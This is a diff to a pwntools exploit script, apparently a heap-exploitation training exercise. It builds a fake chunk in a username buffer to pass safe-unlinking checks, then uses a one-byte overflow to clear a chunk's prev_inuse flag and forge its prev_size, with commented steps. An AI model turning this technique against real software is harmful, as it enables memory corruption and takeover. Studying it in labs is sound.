@@ -46,7 +46,13 @@ io = start()
 # =-=-=- EXAMPLE -=-=-=
 
 # Populate the username field.
-username = b"George"
+username = (p64(0) + p64(0x31) +
+            # size of target chunk should at least
+            # be large enough to overlap desired target
+            p64(elf.sym.user) + p64(elf.sym.user)
+            # passing safe unlinking checks
+            )
+
 io.sendafter(b"username: ", username)
 
 # This program leaks its default heap start address.
@@ -58,6 +64,16 @@ io.recvuntil(b"> ")
 chunk_A = malloc(0x88)
 chunk_B = malloc(0xf8)
 
+# 1. Triggering one-byte overflow, clearing chunk_B's prev_inuse flag.
+#    Also don't forget to provide a valid prev_size field of succeeding chunk.
+prev_size = (heap + 0x90) - (elf.sym.user) # distance between chunk_B and target
+edit(chunk_A, p8(0)*0x80 + p64(prev_size))
+
+# 2. Now, when freeing chunk_B, due to its cleared prev_inuse bit, it get's
+#    consolidated with chunk_A. Addition of sizes (faked prev_size and chunk_A's
+#    original size) should lead to desired target location.
+#    Therefore, for passing safe unlinking checks, as usual target chunk should be
+#    crafted accordingly.
 # =============================================================================
 
 io.interactive()
